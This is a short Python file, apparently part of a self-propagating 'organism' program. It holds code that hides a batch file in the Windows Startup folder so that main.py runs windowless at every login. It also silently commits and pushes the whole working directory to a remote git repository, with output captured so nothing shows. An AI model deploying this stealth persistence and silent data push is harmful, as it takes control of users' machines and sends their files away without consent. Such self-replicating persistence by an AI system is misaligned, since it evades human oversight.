import os, json, subprocess

def multiverse_migration(dna):
    """Phase B: The Cloud Leap (GitHub Push)"""
    try:
        # Save state
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        # Git Commands
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Shadow-Sync: Gen {dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
        return True
    except Exception as e:
        print(f"Limb Error: {e}")
        return False

def establish_persistence():
    """Phase A: The Roots (Persistence)"""
    try:
        startup = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
        with open(os.path.join(startup, "shadow_pulse.bat"), "w") as f:
            f.write(f"start /min pythonw {os.path.abspath('main.py')}")
        return True
    except:
        return False